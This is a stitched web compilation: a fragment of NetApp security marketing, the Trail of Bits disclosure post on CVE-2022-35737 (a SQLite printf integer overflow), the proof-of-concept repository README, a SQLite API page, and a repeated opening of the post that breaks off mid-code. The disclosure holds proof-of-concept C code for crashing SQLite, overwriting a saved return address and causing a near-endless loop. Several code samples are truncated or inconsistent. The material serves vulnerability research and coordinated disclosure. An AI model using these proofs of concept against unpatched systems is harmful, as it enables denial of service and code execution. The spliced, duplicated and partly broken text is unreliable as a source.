resources (data/information), itâs imperative that we protect it. When it comes
to ransomware, this is your guide to addressing and remediating the threat.

Varonis in addressing the advanced techniques around this threat. We have
discussed and captured the solution in this joint white paper.

#### Integration and Solutions Guides

As we continue to tout the key elements of security including key management,
we understand the challenges and value of timeliness as it applies to adoption
and deployment. Due to such challenges we provide integration guides where we
walk through the configuration/provisioning of âkeyâ elements such as key
managers, FPolicy, and other security laden integration solutions.

##### Key Management

NetApp has a long-held and ongoing commitment to compliance with the ever-evolving set of global, regional, and data security and privacy standards and regulations. We uphold this commitment through self-assessments and rigorous audits by independent accredited third parties. These audits validate the adherence of our products and services to the requirements of such standards as ISO/IEC 27001, the GDPR, and the Common Criteria. These assessments help demonstrate NetApp’s integration of internationally recognized processes and best practices in our business, enabling customers to use our products and services regardless of their compliance needs.

NetApp supplies information for each compliance offering (listed at left) that includes a list of in-scope software and hardware and links to the relevant certificates and auditor’s reports.

# Stranger Strings: An exploitable flaw in SQLite

**By Andreas Kellas**

Trail of Bits is publicly disclosing [CVE-2022-35737](https://nvd.nist.gov/vuln/detail/CVE-2022-35737), which affects applications that use the SQLite library API. CVE-2022-35737 was introduced in SQLite version 1.0.12 (released on October 17, 2000) and fixed in [release 3.39.2](https://www.sqlite.org/releaselog/3_39_2.html) (released on July 21, 2022). CVE-2022-35737 is exploitable on 64-bit systems, and exploitability depends on how the program is compiled; arbitrary code execution is confirmed when the library is compiled without stack canaries, but unconfirmed when stack canaries are present, and denial-of-service is confirmed in all cases.

On vulnerable systems, CVE-2022-35737 is exploitable when large string inputs are passed to the SQLite implementations of the `printf` functions and when the format string contains the `%Q`, `%q`, or `%w` format substitution types. This is enough to cause the program to crash. We also show that if the format string contains the `!` special character to enable unicode character scanning, then it is possible to achieve arbitrary code execution in the worst case, or to cause the program to hang and loop (nearly) indefinitely.

SQLite is used [in nearly everything](https://thenewstack.io/the-origin-story-of-sqlite-the-worlds-most-widely-used-database-software/), from naval warships to smartphones to other programming languages. The open-source database engine has a long history of being very secure: many CVEs that are initially pinned to SQLite [actually don’t impact it at all](https://www.sqlite.org/cves.html). This blog post describes the vulnerability and our [proof-of-concept exploits](https://github.com/trailofbits/publications/tree/master/disclosures/CVE-2022-35737#readme), which actually does impact certain versions of SQLite. Although this bug may be difficult to reach in deployed applications, it is a prime example of a vulnerability that is made easier to exploit by “divergent representations” that result from applying compiler optimizations to undefined behavior. In an upcoming blog post, we will show how to find instances of the divergent representations bug in binaries and source code.

## Background: Stumbling onto a bug

A [recent blog post](https://pwning.systems/posts/php_filter_var_shenanigans/) presented a vulnerability in PHP that seemed like the perfect candidate for a variant analysis. The blog’s bug manifested when a 64-bit unsigned integer string length was implicitly converted into a 32-bit signed integer when passed as an argument to a function. We formulated a variant analysis for this bug class, found a few bugs, and while most of them were banal, one in particular stood out: a function used for properly escaping quote characters in the [PHP PDO SQLite module](https://github.com/php/php-src/blob/5d5d9796fc4bd6d91f39db5531ae5713b8afbaec/ext/pdo_sqlite/sqlite_driver.c#L227). And thus began our strange journey into SQLite string formatting.

SQLite is the [most widely deployed database engine](https://www.sqlite.org/mostdeployed.html), thanks in part to its very [permissive licensing](https://www.sqlite.org/copyright.html) and cross-platform, portable design. It is written in C, and can be compiled into a standalone application or a library that exposes APIs for application programmers to use. It seems to be used everywhere—a perception that was reinforced when we tripped right over this vulnerability while hunting for bugs elsewhere.

```

 static zend_string* sqlite_handle_quoter(pdo_dbh_t *dbh, const zend_string *unquoted, enum pdo_param_type paramtype)
 {
		char *quoted = safe_emalloc(2, ZSTR_LEN(unquoted), 3);
		/* TODO use %Q format? */
		sqlite3_snprintf(2*ZSTR_LEN(unquoted) + 3, quoted, "'%q'", ZSTR_VAL(unquoted));
		zend_string *quoted_str = zend_string_init(quoted, strlen(quoted), 0);
		efree(quoted);
		return quoted_str;
 }

```

On line 231, an unsigned long `(2*ZSTR_LEN(unquoted) + 3)` is passed as the first parameter to `sqlite3_snprintf`, which expects a signed integer. This felt exciting, and we quickly scripted a simple proof of concept. We expected to be able to exploit this bug to produce a poorly formatted string with mismatched quote characters by passing large strings to the function, and possibly achieve SQL injection in vulnerable applications.

Imagine our surprise when our [proof of concept](https://github.com/trailofbits/publications/blob/master/disclosures/CVE-2022-35737/pdo-sqlite3-quote-poc.php) crashed the PHP interpreter:

[![](https://blog.trailofbits.com/wp-content/uploads/2022/10/php.png)](https://blog.trailofbits.com/wp-content/uploads/2022/10/php.png)

### There’s a bug in my bug!

We quickly determined that the crash was occurring in the SQLite shared object, so we naturally took a closer look at the `sqlite3_snprintf` function.

SQLite implements [custom versions of the `printf` family](https://www.sqlite.org/c3ref/mprintf.html) of functions and adds the new format specifiers `%Q`, `%q`, and `%w`, which are designed to properly escape quote characters in the input string in order to make safe SQL queries. [For example](https://github.com/trailofbits/publications/blob/master/disclosures/CVE-2022-35737/snprintf-good-example.c), we wrote the following code snippet to properly use `sqlite3_snprintf` with the format specifier `%q` to output a string where all single-quote characters are escaped with another single quote. Additionally, the entire string is wrapped in a leading and trailing single quote, the way the PHP quote function intends:

```

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sqlite3.h>

int main(int argc, char *argv[]) {

    char src[] = "hello, \'world\'!";
    char dst[sizeof(src) + 4];  // Add 4 to account for extra quotes.

    sqlite3_snprintf(sizeof(dst), dst, "'%q'", src);

    printf("src: %s\n", src);
    printf("dst: %s\n", dst);
    return 0;

`sqlite3_snprintf` properly wraps the original string in single quotes, and escapes any existing single-quotes in the input string.

Next, we [changed our program](https://github.com/trailofbits/publications/blob/master/disclosures/CVE-2022-35737/snprintf-crash.c) to imitate the behavior of the PHP script by passing the same large 2GB string directly to `sqlite3_snprintf`:

```

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sqlite3.h>

#define STR_LEN ((0x100000001 - 3) / 2)

int main(int argc, char *argv[]) {

    char *src = calloc(1, STR_LEN + 1); // Account for NULL byte.
    memset(src, 'a', STR_SIZE);
    char *dst = calloc(1, STR_LEN + 3); // Account for extra quotes and NULL byte.

    sqlite3_snprintf(2*STR_LEN + 3, dst, "'%q'", src);

    printf("src: %s\n", src);
    printf("dst: %s\n", dst);
    return 0;
}

```

A crash! We seem to have found a culprit: large inputs to `sqlite3_snprintf`. Thus began a journey down a rabbit hole where we discovered that SQLite does not properly handle large strings in parts of its custom implementations of the `printf` family of functions. Even further down the rabbit hole, we discovered that a compiler optimization made it easier to exploit the SQLite vulnerability.

## The Vulnerability

The custom SQLite `printf` family of functions internally calls the function `sqlite3_str_vappendf`, which handles string formatting. Large string inputs to the `sqlite3_str_vappendf` function can cause signed integer overflow when the format substitution type is `%q`, `%Q`, or `%w`.

`sqlite3_str_vappendf` scans the input `fmt` string and formats the variable-sized argument list according to the format substitution types specified in the `fmt` string. In the case statement for handling the `%q`, `%Q`, and `%w` format specifiers ([src/printf.c:L803-850](https://sqlite.org/src/info?name=6166a30417b05c5b2f82e1f183f75faa2926ad60531c0b688a57dbc951441a20&ln=803-850)), the function scans the input string for quote characters in order to calculate the correct number of output bytes (lines 824-828) and then copies the input to the output buffer and adds quotation characters as required (lines 842-845). In the snippet below, `escarg` points to the input string:

```

case etSQLESCAPE:           /* %q: Escape ' characters */
case etSQLESCAPE2:          /* %Q: Escape ' and enclose in '...' */
case etSQLESCAPE3: {        /* %w: Escape " characters */
  int i, j, k, n, isnull;
  int needQuote;
  char ch;
  char q = ((xtype==etSQLESCAPE3)?'"':'\'');   /* Quote character */
  char *escarg;

  if( bArgList ){
    escarg = getTextArg(pArgList);
  }else{
    escarg = va_arg(ap,char*);
  }
  isnull = escarg==0;
  if( isnull ) escarg = (xtype==etSQLESCAPE2 ? "NULL" : "(NULL)");
  /* For %q, %Q, and %w, the precision is the number of bytes (or
  ** characters if the ! flags is present) to use from the input.
  ** Because of the extra quoting characters inserted, the number
  ** of output characters may be larger than the precision.
  */
  k = precision;
  for(i=n=0; k!=0 && (ch=escarg[i])!=0; i++, k--){
    if( ch==q )  n++;
    if( flag_altform2 && (ch&0xc0)==0xc0 ){
      while( (escarg[i+1]&0xc0)==0x80 ){ i++; }
    }
  }
  needQuote = !isnull && xtype==etSQLESCAPE2;
  n += i + 3;
  if( n>etBUFSIZE ){
    bufpt = zExtra = printfTempBuf(pAccum, n);
    if( bufpt==0 ) return;
  }else{
    bufpt = buf;
  }
  j = 0;
  if( needQuote ) bufpt[j++] = q;
  k = i;
  for(i=0; i<k; i++){
    bufpt[j++] = ch = escarg[i];
    if( ch==q ) bufpt[j++] = ch;
  }
  if( needQuote ) bufpt[j++] = q;
  bufpt[j] = 0;
  length = j;
  goto adjust_width_for_utf8;
}

```

The number of quote characters (`int n`) and the total number of bytes in the input string (`int i`) are used to calculate the maximum total bytes required in the output buffer (L832: `n+=i+3`). This calculation can cause n to overflow to a negative value, for example, when the int type is 32-bits and `n=0` and `i=0x7ffffffe`. This is possible when the input string contains `0x7ffffffe` ASCII characters with no quote characters.

Lines 833-838 are supposed to ensure that a buffer of sufficient size is allocated to receive the formatted bytes of the input string. If the output string size could exceed `etBUFSIZE` bytes (70 bytes, by default), the program dynamically allocates a buffer of sufficient size to hold the output string (line 834). Otherwise, the program expects the output buffer to be smaller than the stack-allocated buffer of etBUFSIZE bytes, and the small stack-allocated buffer is used instead (line 837). At least `i` bytes are copied from the input into the destination buffer. When n overflows to a negative value, the stack-allocated buffer is used, even though `i` can exceed `etBUFSIZE`, resulting in a stack buffer overflow when the input string is copied to the output buffer (line 843).

## The Exploits

But can we do more interesting things with this vulnerability than just crash the target program? Of course!

The input string must be very large to reach the bug condition where n overflows to a negative value at line 832. The challenge is that when the input string is very large, the variable `i` (which counts the number of bytes in the input string) is also very large, resulting in a lot of data written to the stack and causing the program to crash at line 843. We set out to determine whether it is possible to cause n to overflow on line 832, but to also cause `i` to stay small and positive at line 843 and thus avoid crashing. We revisit the loop where `i` is computed, from lines 824 to 830:

```

/* For %q, %Q, and %w, the precision is the number of bytes (or
** characters if the ! flags is present) to use from the input.
** Because of the extra quoting characters inserted, the number
** of output characters may be larger than the precision.
*/
k = precision;
for(i=n=0; k!=0 && (ch=escarg[i])!=0; i++, k--){
  if( ch==q )  n++;
  if( flag_altform2 && (ch&0xc0)==0xc0 ){
    while( (escarg[i+1]&0xc0)==0x80 ){ i++; }
  }
}

```

The purpose of this loop is to scan the input string (`escarg`) for quote characters (`q`), incrementing `n` each time one is found. If our goal is to cause a controlled stack buffer overflow that does not crash the program, then the loop must terminate with values such that `n+=i+3` results in a value less than `etBUFSIZE` (a macro defined to 70) and `i` must be a relatively small positive integer that is greater than `etBUFSIZE`.

The `k` and `flag_altform2` variables in the loop are related to two features of the SQLite `printf` functions: [optional precision](https://www.sqlite.org/printf.html#:~:text=The%20Optional%20Precision%20Field) and the [optional alternate format flag 2](https://www.sqlite.org/printf.html#:~:text=The%20Options%20Flags%20Field), which are both influenced by the format string. In the example below, including `!` in the format string sets `flag_altform2=true`, and the `.80 sets precision=80`:

```
   snprintf3_snprintf(len, buf, “‘%!.80q’”, src)
```

When precision is not set in the format string, it is set by default to -1. Therefore, by default `int k=-1`, and the loop decrements `k` with each iteration, so the outer loop can execute 232 times before `k=0`.

So far in our analysis of CVE-2022-35737, we’ve made few assumptions about the format string passed to the vulnerable function, other than that it contains one of the vulnerable format specifiers (`%Q`, `%q`, or `%w`). To progress further in our exploitation, we need to make one more assumption: that the `flag_altform2` is set by providing a `!` character in the format string.

When `flag_altform2=true`, it is possible to increment `i` in the inner loop without decrementing `k` by including unicode characters in the input string. With this in mind, perhaps we can include enough quote characters in the input to set n to a large positive integer, and then cause `i` to increment in the inner loop until it wraps back around to a small positive integer, and then somehow exit the loop. But how will `i` behave when it overflows beyond the maximum signed integer value? Will it wrap back to `0`, or to a negative value? Is it possible to tell by just looking at the source code? No, it isn’t; this is undefined behavior, so we must inspect the compiled binary to see what choices the compiler made to represent `i`.

### Divergent Representations in the compiled binary

We have been working on an Ubuntu 20.04 host and have a version of `libsqlite.so` version 3.31.1 installed from the APT package manager, so that is the version of the compiled binary that we examine in Binary Ninja:

[![](https://blog.trailofbits.com/wp-content/uploads/2022/10/binary_ninja_101822-1024x1001.png)](https://blog.trailofbits.com/wp-content/uploads/2022/10/binary_ninja_101822.png)

Binary Ninja disassembly of the compiled loop from source code lines 824 to 830, where the `escarg` input string is scanned for quote-characters. [1a] and [1b] indicate source line 825 `escarg[i]; … i++`. [2a] and [2b] indicate source line 828 `escarg[i+1]; … i++.`

At instruction [1a], `r10` contains the address of `escarg`, and `rsi` is used to index into the buffer to fetch a value from it, where the `rsi` register was set by sign-extending the 32-bit `edx` register in the instruction immediately before it. This corresponds to the `escarg[i]` expression on line 825 of the source code. With each loop iteration, `edx` is incremented at instruction [1b]. This means that the source code variable i is represented using signed 32-bit integer semantics, and so when `i` reaches the maximum 32-bit positive signed integer value (`0x7fffffff`), it will increment to `0x80000000` at [1b], which will be sign-extended into `rsi` as `0xffffffff80000000` and used to negatively index into `escarg`.

However, instruction [2a] tells a different story. Here, `r10` still contains the address of `escarg`, but rax+1 is used to index into the buffer, corresponding to the `escarg[i+1]` expression on line 828 of the source code, in the inner loop that scans for unicode characters. Instruction [2b] increments `rax`, but as a 64-bit value—and with no 32-bit sign-extension—before looping back to [2a]. Here, `i` is represented with unsigned 64-bit integer semantics, so that when i exceeds the maximum signed 32-bit integer value (`0x7fffffff`), its next memory access is to `escarg+0x80000000`. **We have divergent representations of the same source variable, and two different values can be read from memory for the same value of the source variable `i`!** This discovery prompted us to search for more instances of these “divergent representations,” and we describe this search in a forthcoming blog post.

Okay, so can we use this compilation quirk to set the conditions for a more interesting exploit of CVE-2022-35737? Turns out, yes.

### Controlling the Saved Return Address

Here’s a quick recap of the conditions that we are trying to set:

```

case etSQLESCAPE:           /* %q: Escape ' characters */
case etSQLESCAPE2:          /* %Q: Escape ' and enclose in '...' */
case etSQLESCAPE3: {        /* %w: Escape " characters */
  int i, j, k, n, isnull;
  int needQuote;
  char ch;
  char q = ((xtype==etSQLESCAPE3)?'"':'\'');   /* Quote character */
  char *escarg;

  if( bArgList ){
    escarg = getTextArg(pArgList);
  }else{
    escarg = va_arg(ap,char*);
  }
  isnull = escarg==0;
  if( isnull ) escarg = (xtype==etSQLESCAPE2 ? "NULL" : "(NULL)");
  /* For %q, %Q, and %w, the precision is the number of bytes (or
  ** characters if the ! flags is present) to use from the input.
  ** Because of the extra quoting characters inserted, the number
  ** of output characters may be larger than the precision.
  */
  k = precision;
  for(i=n=0; k!=0 && (ch=escarg[i])!=0; i++, k--){
    if( ch==q )  n++;
    if( flag_altform2 && (ch&0xc0)==0xc0 ){
      while( (escarg[i+1]&0xc0)==0x80 ){ i++; }
    }
  }
  needQuote = !isnull && xtype==etSQLESCAPE2;
  n += i + 3;
  if( n>etBUFSIZE ){
    bufpt = zExtra = printfTempBuf(pAccum, n);
    if( bufpt==0 ) return;
  }else{
    bufpt = buf;
  }
  j = 0;
  if( needQuote ) bufpt[j++] = q;
  k = i;
  for(i=0; i<k; i++){
    bufpt[j++] = ch = escarg[i];
    if( ch==q ) bufpt[j++] = ch;
  }
  if( needQuote ) bufpt[j++] = q;
  bufpt[j] = 0;
  length = j;
  goto adjust_width_for_utf8;
}

```

Here is a screenshot to highlight what we want to concentrate on:

[![](https://blog.trailofbits.com/wp-content/uploads/2022/10/Screen-Shot-2022-10-18-at-5.41.00-PM-966x1024.png)](https://blog.trailofbits.com/wp-content/uploads/2022/10/Screen-Shot-2022-10-18-at-5.41.00-PM.png)

We want the loop at [1] to terminate with values of `i` and `n` set so that the calculation at [2] overflows, resulting in a value of `n` that is negative or less than `etBUFSIZE (70)` and `i` set to a relatively small positive integer value that is greater than `etBUFSIZE`. This would allow the loop at [3] to write beyond the bounds of the stack-allocated `bufpt`, but without causing the program to crash immediately by writing beyond the stack memory region.

Consider the string input that contains `0x7fffff00` single-quote (‘) characters, followed by a single `0xc0` byte (a unicode prefix) and then by enough `0x80` bytes to bring the total string length to `0x100000100` bytes (followed by a `NULL` byte). Let’s call this string `string1`, and think about what happens when this string is passed to `sqlite3_snprintf`:

```
snprintf3_snprintf(len, buf, “‘%!q’”, string1)
```

(Notice that we’ve changed the format string to allow unicode characters by providing the `!` character.)

When the loop at [1] scans the first `0x7fffff00` bytes of `string1`, `n` and `i` both increment to `0x7fffff00`. On the next loop iteration, the program reads the unicode character prefix from the input string and enters the inner loop, where `i` is represented with 64-bit unsigned semantics. The `i` variable increments to `0x100000100` before a `NULL` byte is encountered, causing the inner loop to terminate. At this point in program execution, `n=0x7fffff00` and, when downcast to a 32-bit value, `i=0x100`. If the loop at [1] terminated at this point, the computation `n+=i+3` would result in `n=0x80000003`, which is negative when treated as a signed value. Meanwhile, `i` is now a small positive integer but is greater than `70 (etBUFSIZE)`, which would result in a stack buffer overflow when `256 (0x100)` bytes are read into a stack buffer of 70 bytes. This shows progress towards our goal: An extra couple of hundred bytes written to the stack are unlikely to reach the end of the stack memory region, but they are likely to reach interesting data saved on the stack, like saved return addresses and stack canaries. We can determine the exact position of this data on the stack by inspecting the target binary, and then adjust the input string size to control how much data is overwritten to the stack buffer.

Unfortunately, this approach will not work as-is, because the loop at [1] does not terminate at the point described above. Because of the divergent representations of the `i` variable, `escarg[i+1]` at line 828 (inner loop) will represent `i` as `0x100000100` and read a `NULL` byte at the end of our large string, but `escarg[i]` at line 825 (outer loop) will represent `i` as `0x100` and instead read a single-quote character (`‘`) from near the beginning of the input string. As a result, the loop exit condition is not met and the loop continues, with `i=0x100` and `n=0x7fffff00`. Notably, by this point `k` has decremented `0x7fffff00` times. Because there is no NULL byte in the input string in the first 231 bytes, `escarg[i]` will never read a `NULL` byte at line 825, and we have to instead depend on `k` decrementing to `0` in order to exit the loop at [1]. We can accomplish this by allowing the outer loop to continue incrementing until `k` has decremented all the way to `0`, but with specially calculated values for `n` and `i`.

With this thought in mind, we can take the same approach described above, which is to increment `n` to a very large positive value by supplying single-quote characters in the input string, and to then set `i` to a small positive value by supplying unicode characters to increment `i` using 64-bit unsigned semantics. We calculate our values by accounting for the fact that the outer loop will increment 232 times because `k` needs to decrement from `0xffffffff` to `0`.

Our [proof of concept](https://github.com/trailofbits/publications/blob/master/disclosures/CVE-2022-35737/snprintf-control-pc.c) uses this insight to control the number of bytes that overflow the stack-allocated buffer and overwrite the saved return address and stack canary:

```

struct payload {

    uint64_t canary;
    uint8_t padding2[CANARY_OFFSET-RETADDR_OFFSET-8];
    uint64_t ropchain[NGADGETS];
}__attribute__((packed, aligned(1)));

int main(int argc, char *argv[]) {

    struct payload p;

    cur = target_i;
    src[cur-1] = '\0';

    sqlite3_snprintf((int) 256, dst, "'%!q'", src);
    free(src);
    return 0;
}

```
[![](https://blog.trailofbits.com/wp-content/uploads/2022/10/fish-.a.out-terminated-by-signal-SIGAERT-Abort.png)](https://blog.trailofbits.com/wp-content/uploads/2022/10/fish-.a.out-terminated-by-signal-SIGAERT-Abort.png)

This proof of concept causes the program to crash, but with a SIGABRT rather than a SIGSEGV. This implies that a stack canary was overwritten and that the vulnerable function tried to return. This is in contrast to the earlier crashing proof of concept that crashed before reaching the function return.

To confirm that we have successfully controlled the saved return address and stack canary, we can use GDB to view the stack frame before the vulnerable function returns:

[![](https://blog.trailofbits.com/wp-content/uploads/2022/10/Screen-Shot-2022-10-18-at-6.01.02-PM-1024x691.png)](https://blog.trailofbits.com/wp-content/uploads/2022/10/Screen-Shot-2022-10-18-at-6.01.02-PM.png)

Executing the proof of concept in a debugger shows that the saved return address is set to `0xdeadbeefdeadbeef`.

Note that in a non-contrived scenario, a real stack canary will contain a `NULL byte`, which would defeat the proof of concept above because the `NULL` byte will cause the string-scanning loop to terminate before the entire payload is copied over the return address. Clever exploitation techniques or specific format string conditions may allow an attacker to bypass this, but our intention is to show that the saved return address can be overwritten.

### Looping (Nearly) Forever

We took our exploitation one step further and developed a [proof of concept](https://github.com/trailofbits/publications/blob/master/disclosures/CVE-2022-35737/snprintf-livelock.c) that uses the divergent representations of the `i` variable to cause loop [1] to iterate nearly infinitely by incrementing `i` 264 times, which effectively takes forever. This is achieved by causing the inner loop to increment `i` 232 times on every iteration of loop [1], which will also increment 232 times. The interesting part of this proof of concept is that it doesn’t actually reach the vulnerable integer overflow computation on line 832, but uses only the undefined behavior that results from allowing string inputs larger than what can be represented with 32-bit integers. All that is required is to fill a buffer of `0x100000000` bytes with unicode prefix characters (a single byte of `0xc0` followed by bytes of `0x80`), and the loop at [1] will never terminate:

```

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sqlite3.h>
#include <unistd.h>

int main(int argc, char *argv[]) {
    size_t src_buf_size = 0x100000001;

    char *src = calloc(1, src_buf_size);
      if (!src) {
        printf("bad allocation\n");
        return -1;
    }
    src[0] = '\xc0';
    memset(src+1, '\x80',  0xffffffff);

    char dst[256];
    sqlite3_snprintf(256, dst, "'%!q'", src);
    free(src);
    return 0;
}

```

We showed that CVE-2022-35737 is exploitable when large string inputs are passed to the SQLite implementations of the `printf` functions and when the format string contains the `%Q`, `%q`, or `%w` format substitution types. This is enough to cause the program to crash. We also showed that if the format string additionally allows for unicode characters by providing the `!` character, then it is possible to overwrite the saved return address and to cause the program to loop (nearly) infinitely.

## But, SQLite is well-tested, right?

SQLite is extensively tested with 100% branch test coverage. We discovered this vulnerability despite the tests, which raises the question: how did the tests miss it?

SQLite maintains an internal memory limit of 1GB, so the vulnerability is not reachable in the SQLite program. The problem is “defined away” by the notion that SQLite does not support big strings necessary to trigger this vulnerability.

However, the C APIs provided by SQLite do not enforce that their inputs adhere to the memory limit, and applications are able to call the vulnerable functions directly. The notion that large strings are unsupported by SQLite is not communicated with the API, so application developers cannot know how to enforce input size limits on these functions. When this code was first written, most processors had 32-bit registers and 4GB of addressable memory, so allocating 1GB strings as input was impractical. Now that 64-bit processors are quite common, allocating such large strings is feasible and the vulnerable conditions are reachable.

Unfortunately, this vulnerability is an example of one where extensive branch test coverage does not help, because no new code paths are introduced. 100% branch coverage says that every line of code has been executed, but not how many times. This vulnerability is the result of invalid data that causes code to execute billions of times more than it should.

The thoroughness of SQLite’s tests is remarkable — the discovery of this vulnerability should not be taken as a knock on the robustness of the tests. In fact, we wish more projects put as much emphasis on testing as SQLite does. Nonetheless, this bug is evidence that even the best-tested software can have exploitable bugs.

## Conclusion

Not every system or application that uses the SQLite `printf` functions is vulnerable. For those that are, CVE-2022-35737 is a critical vulnerability that can allow attackers to crash or control programs. The bug has been particularly interesting to analyze, for a few reasons. For one, the inputs required to reach the bug condition are very large, which makes it difficult for traditional fuzzers to reach, and so techniques like static and manual analysis were required to find it. For another, it’s a bug that may not have seemed like an error at the time that it was written (dating back to 2000 in the SQLite source code) when systems were primarily 32-bit architectures. And—most interestingly to us at Trail of Bits—its exploitation was made easier by the discovered “divergent representations” of the same source variable, which we explore further in a separate blog post.

I’d like to thank my mentor, Peter Goodman, for his expert guidance throughout my summer internship with Trail of Bits. I’d also like to thank Nick Selby for his help in navigating the responsible disclosure process, and all members of the Trail of Bits team who assisted in advising and writing this blog post.

## Coordinated disclosure

**July 14, 2022:** Reported vulnerability to the Computer Emergency Response Team (CERT) Coordination Center.

**July 15, 2022:** CERT/CC reported vulnerability to SQLite maintainers.

**July 18, 2022:** SQLite maintainers confirmed the vulnerability and fixed it in source code.

**July 21, 2022:** SQLite maintainers released SQLite version 3.39.2 with fix.

We would like to thank the teams at SQLite and CERT/CC for working swiftly with us to address these issues.

# CVE-2022-35737

Integer overflow in SQLite3 `sqlite3_str_vappendf` function.

CVSS 7.5 CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H

CVE-2022-35737 was introduced in SQLite version 1.0.12 and fixed in release
3.39.2, available on July 21, 2022. It is exploitable on 64-bit systems, and
exploitability depends on how the program is compiled: arbitrary code execution
is confirmed when the library is compiled without stack canaries, but
unconfirmed when stack canaries are present; denial-of-service is confirmed in
all cases.

Large string inputs to the `sqlite3_str_vappendf` function can cause signed
integer overflow when the format specifier is `%q`, `%Q`, or `%w`. This can
cause user-controlled data to be written beyond the bounds of a stack-allocated
buffer, resulting in program crash, infinite loop, or possible arbitrary code
execution.

This directory contains proof-of-concept code that demonstrates the
exploitation of the vulnerability.

## Proofs-of-Concept

### `snprintf-good-example.c`

Demonstrates that `sqlite3_snprintf` correctly escapes all existing single-quote
characters and adds a leading and trailing single quote to a short string.

Expected outcome:

```
$ ./snprintf-good-example
src: hello, 'world'!
dst: 'hello, ''world''!'

```

### `snprintf-crash.c`

Demonstrates that `sqlite_snprintf` crashes when called with sufficiently large
strings.

Expected outcome: SIGSEGV

```
$ ./snprintf-crash
Segmentation fault (core dumped)

```

### `snprintf-control-pc.c`

Demonstrates that it is possible to control the length of the buffer overflow to
overwrite targeted data on the stack, like the stack canary and saved return
address.

Expected outcome: SIGABRT

```
$ ./snprintf-control-pc
*** stack smashing detected ***: terminated
Aborted (core dumped)

```

### `snprintf-livelock.c`

Demonstrates that it is possible to cause the vulnerable program to loop nearly
endlessly (2^64 iterations).

Expected outcome: loop endlessly (on a reasonable timescale)

```
$ ./snprintf-livelock
<no output>
^C

```

### `pdo-sqlite3-quote-poc.php`

Demonstrates that CVE-2022-35737 is reachable from the PHP interpreter when run
with non-default memory limits.

Expected outcome: SIGSEGV

```
$ php pdo-sqlite3-quote-poc.php
Segmentation fault (core dumped)

```

## Dockerfile

If desired, the proofs-of-concept can be executed in a Docker container that
has dependencies pinned to the vulnerable version of the SQLite library.

```

[## SQLite C Interface](../c3ref/intro.html)
## Formatted String Printing Functions

> ```
>
> char *sqlite3_mprintf(const char*,...);
> char *sqlite3_vmprintf(const char*, va_list);
> char *sqlite3_snprintf(int,char*,const char*, ...);
> char *sqlite3_vsnprintf(int,char*,const char*, va_list);
>
> ```

These routines are work-alikes of the "printf()" family of functions
from the standard C library.
These routines understand most of the common formatting options from
the standard library printf()
plus some additional non-standard formats ([%q](../printf.html#percentq), [%Q](../printf.html#percentq), [%w](../printf.html#percentw), and [%z](../printf.html#percentz)).
See the [built-in printf()](../printf.html) documentation for details.

The sqlite3\_mprintf() and sqlite3\_vmprintf() routines write their
results into memory obtained from [sqlite3\_malloc64()](../c3ref/free.html).
The strings returned by these two routines should be
released by [sqlite3\_free()](../c3ref/free.html). Both routines return a
NULL pointer if [sqlite3\_malloc64()](../c3ref/free.html) is unable to allocate enough
memory to hold the resulting string.

The sqlite3\_snprintf() routine is similar to "snprintf()" from
the standard C library. The result is written into the
buffer supplied as the second parameter whose size is given by
the first parameter. Note that the order of the
first two parameters is reversed from snprintf(). This is an
historical accident that cannot be fixed without breaking
backwards compatibility. Note also that sqlite3\_snprintf()
returns a pointer to its buffer instead of the number of
characters actually written into the buffer. We admit that
the number of characters written would be a more useful return
value but we cannot change the implementation of sqlite3\_snprintf()
now without breaking compatibility.

As long as the buffer size is greater than zero, sqlite3\_snprintf()
guarantees that the buffer is always zero-terminated. The first
parameter "n" is the total size of the buffer, including space for
the zero terminator. So the longest string that can be completely
written will be n-1 characters.

The sqlite3\_vsnprintf() routine is a varargs version of sqlite3\_snprintf().

[Objects](../c3ref/objlist.html),
[Constants](../c3ref/constlist.html), and
[Functions](../c3ref/funclist.html).

# Stranger Strings: An exploitable flaw in SQLite

**By Andreas Kellas**

Trail of Bits is publicly disclosing [CVE-2022-35737](https://nvd.nist.gov/vuln/detail/CVE-2022-35737), which affects applications that use the SQLite library API. CVE-2022-35737 was introduced in SQLite version 1.0.12 (released on October 17, 2000) and fixed in [release 3.39.2](https://www.sqlite.org/releaselog/3_39_2.html) (released on July 21, 2022). CVE-2022-35737 is exploitable on 64-bit systems, and exploitability depends on how the program is compiled; arbitrary code execution is confirmed when the library is compiled without stack canaries, but unconfirmed when stack canaries are present, and denial-of-service is confirmed in all cases.

On vulnerable systems, CVE-2022-35737 is exploitable when large string inputs are passed to the SQLite implementations of the `printf` functions and when the format string contains the `%Q`, `%q`, or `%w` format substitution types. This is enough to cause the program to crash. We also show that if the format string contains the `!` special character to enable unicode character scanning, then it is possible to achieve arbitrary code execution in the worst case, or to cause the program to hang and loop (nearly) indefinitely.

SQLite is used [in nearly everything](https://thenewstack.io/the-origin-story-of-sqlite-the-worlds-most-widely-used-database-software/), from naval warships to smartphones to other programming languages. The open-source database engine has a long history of being very secure: many CVEs that are initially pinned to SQLite [actually don’t impact it at all](https://www.sqlite.org/cves.html). This blog post describes the vulnerability and our [proof-of-concept exploits](https://github.com/trailofbits/publications/tree/master/disclosures/CVE-2022-35737#readme), which actually does impact certain versions of SQLite. Although this bug may be difficult to reach in deployed applications, it is a prime example of a vulnerability that is made easier to exploit by “divergent representations” that result from applying compiler optimizations to undefined behavior. In an upcoming blog post, we will show how to find instances of the divergent representations bug in binaries and source code.

## Background: Stumbling onto a bug

A [recent blog post](https://pwning.systems/posts/php_filter_var_shenanigans/) presented a vulnerability in PHP that seemed like the perfect candidate for a variant analysis. The blog’s bug manifested when a 64-bit unsigned integer string length was implicitly converted into a 32-bit signed integer when passed as an argument to a function. We formulated a variant analysis for this bug class, found a few bugs, and while most of them were banal, one in particular stood out: a function used for properly escaping quote characters in the [PHP PDO SQLite module](https://github.com/php/php-src/blob/5d5d9796fc4bd6d91f39db5531ae5713b8afbaec/ext/pdo_sqlite/sqlite_driver.c#L227). And thus began our strange journey into SQLite string formatting.

SQLite is the [most widely deployed database engine](https://www.sqlite.org/mostdeployed.html), thanks in part to its very [permissive licensing](https://www.sqlite.org/copyright.html) and cross-platform, portable design. It is written in C, and can be compiled into a standalone application or a library that exposes APIs for application programmers to use. It seems to be used everywhere—a perception that was reinforced when we tripped right over this vulnerability while hunting for bugs elsewhere.

```

